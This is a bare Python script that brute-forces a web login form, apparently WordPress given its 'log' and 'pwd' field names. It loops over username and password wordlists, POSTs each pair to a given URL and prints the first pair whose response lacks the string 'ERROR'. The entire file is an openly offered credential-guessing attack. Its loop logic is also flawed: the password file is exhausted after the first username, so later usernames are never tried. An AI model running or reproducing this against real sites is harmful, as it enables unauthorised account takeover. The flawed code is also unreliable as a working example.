#!/usr/bin/python3

import requests
import sys
import os

def main():
    url = sys.argv[1]
    name = sys.argv[2]
    pasw = sys.argv[3]

    r = requests.get(url)

    if str(r.status_code) == '200':
        print('Page Found')
        if os.path.exists(name) and os.path.exists(pasw):
            print('Files exist.\n \n Starting..')
            with open(name, 'r') as n:
                with open(pasw, 'r')as p:
                    for i in n.readlines():
                        for x in p.readlines():
                            na = i.strip('\n')
                            ps = x.strip('\n')
                            payload = {'log' : na ,'pwd' : ps}
                            a = requests.post(url, data=payload)
                            print('[*] Trying with Name: ' , na , ' and Pass: ', ps)
                            
                            if not 'ERROR' in a.text:
                                print ('[*] Username found: ',na)
                                print ('[*] Password found: ',ps)
                                exit(0)
                                
main()
